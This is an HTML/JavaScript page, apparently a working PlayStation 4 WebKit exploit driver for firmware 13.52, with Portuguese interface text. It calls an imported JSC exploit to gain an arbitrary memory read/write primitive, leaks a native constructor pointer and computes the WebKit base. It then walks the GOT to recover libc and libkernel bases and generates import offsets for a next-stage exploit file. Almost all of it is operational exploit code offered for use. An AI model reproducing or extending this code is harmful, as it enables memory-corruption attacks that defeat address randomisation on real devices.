<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PS4 WebKit Exploit (13.52 - Auto Offset Extractor)</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:14px}
h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
  margin-bottom:4px;text-align:center}
#fw{font-size:11px;color:#444;margin-bottom:12px;text-align:center}

#sb{width:100%;max-width:720px;background:#0c0e18;border:1px solid #1a1d2e;
  border-radius:6px;padding:10px 14px;margin-bottom:8px;display:flex;align-items:center;gap:8px}
#dot{width:9px;height:9px;border-radius:50%;background:#333;flex-shrink:0;transition:background .3s}
#dot.r{background:#f0a500;animation:p 1s infinite}
#dot.ok{background:#00c853}
#dot.e{background:#ff4444}
@keyframes p{0%,100%{opacity:1}50%{opacity:.2}}
#st{font-size:12px;color:#bbb;flex:1}
#bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
  font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}

/* console */
#con{width:100%;max-width:720px;height:320px;background:#050508;
  border:1px solid #161825;border-radius:6px;overflow-y:auto;
  padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
.e{color:#ff5252;font-weight:bold}.d{color:#333}.a{color:#bd93f9}
.s{color:#00c8ff;border-top:1px solid #161825;margin-top:5px;
  padding-top:5px;letter-spacing:1px}.f{color:#a78bfa;font-weight:bold}

/* cards */
#cards{width:100%;max-width:720px;display:grid;
  grid-template-columns:1fr 1fr;gap:6px;margin-bottom:8px}
.card{background:#0b0d1a;border:1px solid #1a1d2e;border-radius:5px;padding:8px 12px}
.card .cl{font-size:9px;color:#444;text-transform:uppercase;letter-spacing:2px;margin-bottom:3px}
.card .cv{font-size:12px;color:#bd93f9}
.card .cv.na{color:#222}

/* constants output box */
#cbox{width:100%;max-width:720px;background:#03100a;border:2px solid #00c853;
  border-radius:6px;padding:12px;display:none;margin-bottom:8px;
  font-size:11px;line-height:1.6;color:#4ade80;white-space:pre-wrap;word-break:break-all}
#cbox .ct{color:#fff;font-weight:bold;margin-bottom:6px;
  border-bottom:1px solid #0a2a15;padding-bottom:4px}
</style>
</head>
<body>

<h1>PS4 WebKit Exploit</h1>
<div id="fw">detectando...</div>

<div id="sb">
  <div id="dot" class="r"></div>
  <div id="st">Inicializando...</div>
</div>
<div id="bars">
  <span id="ba">tentativa: 1</span>
  <span id="bg">estágio: init</span>
</div>

<div id="con"></div>

<!-- Base cards -->
<div id="cards">
  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
  <div class="card"><div class="cl">__ps5NativeCtor</div><div class="cv na" id="c-ct">—</div></div>
</div>

<!-- Constants output -->
<div id="cbox">
  <div class="ct">// ═══ GERAÇÃO AUTOMÁTICA PARA O 13.52.js ═══</div>
  <div id="c-out"></div>
</div>

<script src="./13.52.js?v=1"></script>

<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 600) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') {
  $st.textContent = m; $dot.className = s;
}
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

// Extrator automático de stubs via GOT
function extractImportOffsets(p, webkitBase) {
  logH('EXTRATOR AUTOMÁTICO DE IMPORTS (GOT)');
  let foundMemsetImport = 0;
  let foundStackImport = 0;
  let libcBaseFound = null;
  let lkBaseFound = null;

  try {
    let gotAddress = null;
    for (let off = 0x1000; off < 0x50000; off += 8) {
      try {
        const val1 = p.read8(webkitBase.add32(off));
        const val2 = p.read8(webkitBase.add32(off + 8));
        if (val1.low === 3 && val2.hi > 0) {
          gotAddress = webkitBase.add32(val2.low);
          break;
        }
      } catch (e) {}
    }

    if (!gotAddress) {
      log('[-] GOT não localizada para extração.', 'w');
      return;
    }

    log('[+] Analisando slots da GOT em busca de stubs...', 'i');
    for (let s = 0; s < 200; s++) {
      try {
        const slotAddr = gotAddress.add32(s * 8);
        const ptrVal = p.read8(slotAddr);
        const hi = ptrVal.hi;
        const alignedLow = ptrVal.low & ~0x3FFF;

        if (hi === 0x80 && !lkBaseFound) {
          lkBaseFound = new int64(alignedLow, hi);
          foundStackImport = slotAddr.sub32(webkitBase.low).low;
          log(`[+] __stack_chk_guard_import encontrado em: 0x${foundStackImport.toString(16)}`, 'ok');
        } else if (hi >= 0x90 && hi <= 0x98 && !libcBaseFound) {
          libcBaseFound = new int64(alignedLow, hi);
          foundMemsetImport = slotAddr.sub32(webkitBase.low).low;
          log(`[+] memset_import encontrado em: 0x${foundMemsetImport.toString(16)}`, 'ok');
        }
      } catch (e) {}
    }

    return { foundMemsetImport, foundStackImport, libcBaseFound, lkBaseFound };
  } catch (err) {
    log('[-] Erro na extração: ' + err.message, 'e');
    return null;
  }
}

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC (core.js)...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = `tentativa: ${attempt || 1}`;
        document.getElementById('bg').textContent = `estágio: ${tag.toLowerCase()}`;
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: exploit JSC concluído!', 'ok');
  setStatus('Instalando R/W arbitrário...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
  setStatus('Resolvendo bases...', 'r');
  logH('RESOLUÇÃO DA BASE DO WEBKIT (13.52)');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(), 'a');
    setCard('c-ct', '0x' + ctorInt64.toString());

    const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined') 
               ? OFFSET_wk_host_constructor_candidates[0] 
               : 0x36F9E20;

    const resolvedBaseVal = ctor - hc;
    const baseHi = Math.floor(resolvedBaseVal / 0x100000000);
    const baseLo = resolvedBaseVal - baseHi * 0x100000000;
    const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);

    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
    setCard('c-wk', '0x' + webkitBase.toString());

    // Aguarda a estabilização completa da primitiva antes de rodar o extrator na GOT
    setStatus('Primitiva R/W pronta — Aguardando estabilização...', 'ok');
    
    setTimeout(() => {
      logH('INICIANDO EXTRAÇÃO APÓS ESTABILIZAÇÃO');
      const extracted = extractImportOffsets(p, webkitBase);

      if (extracted && extracted.lkBaseFound) setCard('c-lk', '0x' + extracted.lkBaseFound.toString());
      if (extracted && extracted.libcBaseFound) setCard('c-lc', '0x' + extracted.libcBaseFound.toString());

      setStatus('Extração concluída com sucesso!', 'ok');
      log('✔ Offsets de importação gerados na caixa abaixo.', 'ok');

      const cbox = document.getElementById('cbox');
      cbox.style.display = 'block';
      
      let generatedText = 
        `const OFFSET_wk_memset_import = 0x${extracted && extracted.foundMemsetImport ? extracted.foundMemsetImport.toString(16) : '0'};\n` +
        `const OFFSET_wk___stack_chk_guard_import = 0x${extracted && extracted.foundStackImport ? extracted.foundStackImport.toString(16) : '0'};\n` +
        `// Bases detectadas em runtime:\n` +
        `// WebKit: 0x${webkitBase.toString()}\n` +
        `// Libc: ${extracted && extracted.libcBaseFound ? '0x' + extracted.libcBaseFound.toString() : 'N/A'}\n` +
        `// Libkernel: ${extracted && extracted.lkBaseFound ? '0x' + extracted.lkBaseFound.toString() : 'N/A'}`;

      document.getElementById('c-out').textContent = generatedText;
    }, 1000);

  } else {
    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
    setStatus('Erro ao capturar NativeCtor', 'e');
  }
}

main();
</script>
</body>
</html>
